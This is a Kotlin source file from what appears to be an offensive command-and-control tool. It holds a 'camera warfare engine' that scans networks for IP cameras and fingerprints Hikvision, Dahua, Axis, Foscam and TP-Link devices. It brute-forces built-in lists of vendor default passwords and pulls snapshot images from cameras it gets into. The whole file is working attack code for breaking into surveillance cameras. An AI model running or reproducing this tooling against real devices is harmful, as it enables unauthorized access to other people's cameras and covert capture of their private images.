package com.projectzerodays.quantumcli.ops

import com.projectzerodays.quantumcli.c2.CameraHit
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.SocketTimeoutException
import java.util.UUID
import java.util.concurrent.ConcurrentHashMap

/** CAMERA WARFARE ENGINE parity — discovery, vendor intel, cred checks. */
object CamWar {

    val CAM_PORTS: List<Int> = listOf(
        80, 443, 554, 37777, 37778, 8000, 8001, 8080, 8081, 8899,
        34567, 34571, 34599, 5000
    )

    private val VENDOR_HINTS: List<Pair<String, List<String>>> = listOf(
        "hikvision" to listOf("hikvision", "webcomponents", "doc/page/login", "www-uc", "embedded_net_dvr", "netdvr", "hik-"),
        "dahua" to listOf("dahua", "login_module.js", "netkeyboard", "dvrdvs", "dss"),
        "axis" to listOf("axis", "axis-cgi"),
        "foscam" to listOf("foscam", "cgi-bin/hi3510", "get_params.cgi", "ipcam"),
        "tplink" to listOf("tapo", "tplink"),
        "generic" to listOf("ipcamera", "netcam", "webcam", "rtsp"),
    )

    val CREDS: Map<String, List<Pair<String, String>>> = mapOf(
        "hikvision" to listOf(
            "admin" to "admin", "admin" to "12345", "admin" to "888888",
            "admin" to "66668888", "admin" to "Admin123", "admin" to ""
        ),
        "dahua" to listOf(
            "admin" to "admin", "admin" to "admin1234", "888888" to "888888",
            "admin" to "123456"
        ),
        "axis" to listOf(
            "root" to "pass", "root" to "root", "admin" to "1234", "admin" to "admin"
        ),
        "foscam" to listOf("admin" to "", "admin" to "admin", "admin" to "12345", "admin" to "888888"),
        "tplink" to listOf("admin" to "admin", "admin" to "password"),
        "generic" to listOf(
            "admin" to "admin", "admin" to "12345", "admin" to "", "root" to "root",
            "user" to "user", "guest" to "guest", "888888" to "888888"
        ),
    )

    private val INFO_ENDPOINTS: Map<String, Pair<String, String>> = mapOf(
        "hikvision" to ("/ISAPI/System/deviceInfo" to "digest"),
        "dahua" to ("/cgi-bin/magicBox.cgi?action=getSystemInfo" to "digest"),
        "axis" to ("/axis-cgi/param.cgi?action=list" to "basic"),
        "foscam" to ("/get_params.cgi" to "basic"),
        "generic" to ("/" to "basic"),
    )

    private val SNAPSHOT: Map<String, List<Pair<String, String>>> = mapOf(
        "hikvision" to listOf(
            "/ISAPI/Streaming/channels/101/picture" to "digest",
            "/ISAPI/Streaming/channels/1/picture" to "digest",
            "/ISAPI/System/Video/inputs/channels/1/picture" to "digest"
        ),
        "dahua" to listOf(
            "/cgi-bin/snapshot.cgi" to "digest",
            "/cgi-bin/snapshot.cgi?channel=1" to "digest"
        ),
        "axis" to listOf("/axis-cgi/jpg/image.cgi?resolution=640x480" to "basic"),
        "foscam" to listOf("/snapshot.cgi" to "basic"),
        "generic" to listOf(),
    )

    val GENERIC_SNAPSHOTS: List<Pair<String, String>> = listOf(
        "/snapshot.cgi" to "basic",
        "/image.jpg" to "basic",
        "/snap.jpg" to "basic",
        "/snapshot.jpg" to "basic",
        "/onvif-http/snapshot.jpg" to "basic",
        "/cgi-bin/snapshot.cgi" to "digest",
        "/ISAPI/Streaming/channels/101/picture" to "digest",
        "/tmpfs/snap.jpg" to "basic",
        "/webcapture.jpg?command=snap&channel=1" to "basic",
    )

    fun vendorFromStr(s: String?): String {
        val low = (s ?: "").lowercase()
        for ((vendor, hints) in VENDOR_HINTS) {
            if (hints.any { low.contains(it) }) return vendor
        }
        return if (low.contains("vivotek")) "vivotek" else "unknown"
    }

    /** ONVIF WS-Discovery multicast probe (NetworkVideoTransmitter + Device). */
    fun wsDiscovery(timeoutSec: Int = 5): List<CameraHit> {
        val probe = (
            "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" " +
                "xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" " +
                "xmlns:d=\"http://schemas.xmlsoap.org/ws/2005/04/discovery\" " +
                "xmlns:dn=\"http://www.onvif.org/ver10/network/wsdl\">" +
                "<s:Header>" +
                "<a:MessageID>urn:uuid:" + UUID.randomUUID() + "</a:MessageID>" +
                "<a:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</a:To>" +
                "<a:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</a:Action>" +
                "</s:Header>" +
                "<s:Body><d:Probe>" +
                "<d:Types>dn:NetworkVideoTransmitter tds:Device</d:Types>" +
                "<d:Scopes/>" +
                "</d:Probe></s:Body></s:Envelope>"
            ).toByteArray(Charsets.UTF_8)

        val found = LinkedHashMap<String, CameraHit>()
        try {
            DatagramSocket().use { s ->
                s.broadcast = true
                s.soTimeout = 500
                val pkt = DatagramPacket(
                    probe, probe.size,
                    InetAddress.getByName("239.255.255.250"), 3702
                )
                s.send(pkt)
                val end = System.currentTimeMillis() + timeoutSec * 1000L
                val buf = ByteArray(65535)
                while (System.currentTimeMillis() < end) {
                    val rx = DatagramPacket(buf, buf.size)
                    try {
                        s.receive(rx)
                    } catch (e: SocketTimeoutException) {
                        continue
                    }
                    val txt = String(buf, 0, rx.length, Charsets.UTF_8)
                    val ip = Regex("http://([0-9.]+):?[0-9]*").find(txt)?.groupValues?.get(1)
                        ?: rx.address.hostAddress
                    if (ip != null) {
                        val vendor = vendorFromStr(txt)
                        val existing = found[ip]
                        val ports = existing?.ports ?: listOf(80)
                        found[ip] = CameraHit(
                            ip = ip,
                            vendor = vendor,
                            ports = ports,
                            source = "ws-discovery"
                        )
                    }
                }
            }
        } catch (e: Exception) {
            // network unavailable mid-probe; keep whatever was collected
        }
        return found.values.toList()
    }

    /**
     * Full camera sweep: WS-Discovery + CIDR port scan over CAM_PORTS with
     * vendor banner detection and optional default-credential checks.
     */
    fun discover(cidr: String?, bruteCreds: Boolean = false): List<CameraHit> {
        val hits = LinkedHashMap<String, CameraHit>()
        for (cam in wsDiscovery()) {
            hits[cam.ip] = cam
        }
        val scope = if (cidr.isNullOrBlank()) Net.localScope() else cidr
        val hosts = Net.cidrHosts(scope)
        val portHits = ConcurrentHashMap<String, MutableList<Int>>()
        Net.parMap(hosts, 32) { ip ->
            val open = CAM_PORTS.filter { Net.tcpProbe(ip, it, 400) }
            if (open.isNotEmpty()) {
                portHits[ip] = open.toMutableList()
            }
            null
        }
        for ((ip, ports) in portHits) {
            var vendor = "generic"
            var model: String? = null
            for (p in listOf(80, 443, 8000, 8080, 8081, 8899, 5000)) {
                if (!ports.contains(p)) continue
                val scheme = if (p == 443) "https" else "http"
                val r = Net.httpGet("$scheme://$ip:$p/", timeoutMs = 2000)
                if (r.error == null) {
                    val hay = r.text(2000) + " " + (r.headers["server"] ?: "")
                    val v = vendorFromStr(hay)
                    if (v != "unknown") {
                        vendor = v
                        break
                    }
                }
            }
            if (ports.contains(554)) {
                val rtsp = Net.banner(
                    ip, 554, 2000,
                    "OPTIONS rtsp://$ip:554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n".toByteArray()
                )
                if (rtsp != null) {
                    val v = vendorFromStr(rtsp)
                    if (v != "unknown") vendor = v
                }
            }
            var creds: String? = null
            if (bruteCreds) {
                creds = checkCreds(ip, vendor)
            }
            if (vendor == "generic" && !ports.contains(554) && ports.none { it in CAM_PORTS }) {
                continue
            }
            hits[ip] = CameraHit(
                ip = ip,
                vendor = vendor,
                ports = ports.sorted(),
                source = "portscan",
                creds = creds,
                model = model
            )
        }
        return hits.values.sortedBy { it.ip }
    }

    /** Try vendor default creds against the vendor info endpoint. */
    fun checkCreds(ip: String, vendor: String): String? {
        val endpoint = INFO_ENDPOINTS[vendor] ?: INFO_ENDPOINTS["generic"] ?: return null
        val (path, _) = endpoint
        for ((u, p) in CREDS[vendor] ?: CREDS["generic"] ?: return null) {
            val r = Net.httpGetAuth("http://$ip$path", u, p, timeoutMs = 2500)
            if (r.status in 200..299) {
                return "$u:$p"
            }
        }
        return null
    }

    /** Pull a snapshot frame (vendor + generic endpoints, basic/digest). */
    fun snapshot(ip: String, vendor: String, creds: String? = null): ByteArray? {
        val (user, pass) = if (creds != null && creds.contains(":")) {
            val parts = creds.split(":", limit = 2)
            parts[0] to parts.getOrElse(1) { "" }
        } else {
            "admin" to "admin"
        }
        val paths = (SNAPSHOT[vendor] ?: emptyList()) + GENERIC_SNAPSHOTS
        for ((path, _) in paths) {
            val r = Net.httpGetAuth("http://$ip$path", user, pass, timeoutMs = 3000)
            if (r.ok && r.body.size > 100) {
                val ct = r.headers["content-type"] ?: ""
                if (ct.contains("image", ignoreCase = true) || r.body[0] == 0xFF.toByte()) {
                    return r.body
                }
            }
        }
        return null
    }
}
